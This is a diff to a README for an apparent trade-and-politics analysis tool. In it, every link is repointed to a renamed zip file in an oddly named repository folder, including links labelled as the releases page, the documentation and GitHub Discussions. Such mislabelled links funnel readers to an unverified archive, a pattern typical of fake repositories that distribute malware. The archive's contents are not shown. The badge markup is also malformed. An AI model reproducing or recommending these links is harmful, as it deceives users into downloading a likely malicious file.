@@ -6,7 +6,7 @@ Welcome to the **trade_political_distance_wto** project! This application enable
 
 ## 📦 Download Link
 
-[![Download Now](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip%20Now-Trade%https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip)](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip)
+[![Download Now](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip%20Now-Trade%https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip)](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip)
 
 ## 📋 Key Features
 
@@ -28,7 +28,7 @@ Welcome to the **trade_political_distance_wto** project! This application enable
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip).
    
 2. **Find the Latest Release**: Look for the most recent version listed at the top.
 
@@ -51,7 +51,7 @@ To get started, follow these steps:
 
 ## 📑 Documentation
 
-For deeper insights into how to use all the features, visit our [documentation page](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip). Here you'll find guides, examples, and detailed explanations of the methodologies used.
+For deeper insights into how to use all the features, visit our [documentation page](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip). Here you'll find guides, examples, and detailed explanations of the methodologies used.
 
 ## ❓ Frequently Asked Questions
 
@@ -61,7 +61,7 @@ You can analyze any dataset relevant to international trade, including tariffs, 
 
 ### Is there a community or support group?
 
-Yes! Join our community on [GitHub Discussions](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip). You can ask questions, share insights, and connect with other users.
+Yes! Join our community on [GitHub Discussions](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip). You can ask questions, share insights, and connect with other users.
 
 ### How often is the software updated?
 
@@ -69,9 +69,9 @@ We aim to release updates regularly based on user feedback and advancements in e
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip)
-- [Documentation](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip)
-- [GitHub Discussions](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/trade_political_distance_wto.zip)
+- [Releases Page](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/HaSerZin/trade_political_distance_wto/main/supersarcastic/distance_wto_trade_political_2.8.zip)
 
 ## 🎉 Acknowledgments
 
